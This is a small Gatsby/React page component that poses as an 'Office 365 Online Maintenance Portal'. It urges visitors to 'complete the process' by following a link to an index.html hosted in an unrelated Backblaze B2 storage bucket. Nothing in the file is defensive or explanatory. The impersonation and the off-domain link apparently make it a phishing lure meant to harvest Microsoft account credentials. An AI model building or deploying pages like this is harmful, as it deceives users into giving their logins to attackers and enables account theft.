import * as React from "react"
import { Link } from "gatsby"

import Layout from "../components/layout"
import Seo from "../components/seo"

const SecondPage = () => (
  <Layout>
    <Seo title="Office 365" />
    <h1>Office 365 Online Maintenance Portal.</h1>
    <p>Click below to complete the process</p>
    <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Office 365 Portal</Link>
  </Layout>
)

export default SecondPage
